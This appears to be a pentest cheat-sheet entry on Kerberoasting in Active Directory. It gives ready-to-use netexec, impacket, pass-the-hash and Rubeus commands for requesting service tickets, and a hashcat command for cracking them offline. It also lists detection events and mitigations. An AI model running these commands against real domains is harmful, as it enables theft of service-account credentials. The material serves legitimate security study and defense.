---
title: Kerberoasting
category: AD / Credentials
order: 10
tags: [kerberos, spn, cracking, credentials]
summary: >
  Any domain user can request a service ticket (TGS) for any account with an
  SPN. The ticket is encrypted with the service account's key, so it can be
  cracked offline to recover that account's password.
prerequisites:
  - Any valid domain account ($user / $password or $nthash)
  - Target service accounts that have an SPN set (often svc_* / MSSQL / IIS)
tools: [netexec, impacket (GetUserSPNs), Rubeus, hashcat]
detection:
  - Event 4769 (TGS request) with RC4 (0x17) encryption, bursts from one user
  - Honeypot SPN accounts that should never be requested
mitigation:
  - Use gMSA / long random passwords (25+ chars) for service accounts
  - Enforce AES; alert on RC4 TGS requests; remove stale SPNs
refs:
  - { label: "HackTricks — Kerberoast", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast" }
  - { label: "Rubeus", url: "https://github.com/GhostPack/Rubeus" }
---

Service accounts with an SPN are the target: their TGS is signed with the
account's NT key, and if the password is weak it cracks offline — no
interaction with the account, no lockout risk.

## Request the tickets

```sh
# netexec — enumerate SPNs and roast in one shot
netexec ldap $dc_ip -u $user -p $password --kerberoasting kerb.txt
```

```sh
# impacket — list, then request
GetUserSPNs.py $domain/$user:$password -dc-ip $dc_ip
GetUserSPNs.py $domain/$user:$password -dc-ip $dc_ip -request -outputfile kerb.txt
```

```sh
# pass-the-hash variant (no cleartext)
GetUserSPNs.py $domain/$user -hashes :$nthash -dc-ip $dc_ip -request
```

```powershell
# from a domain-joined host (Rubeus)
Rubeus.exe kerberoast /nowrap /outfile:kerb.txt
```

## Crack offline

```sh
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --rules-file best64.rule
```

> If a user is Kerberoastable only because you can write its `servicePrincipalName`
> (via an ACL edge), that's **Targeted Kerberoasting** — see the ACL abuse section.
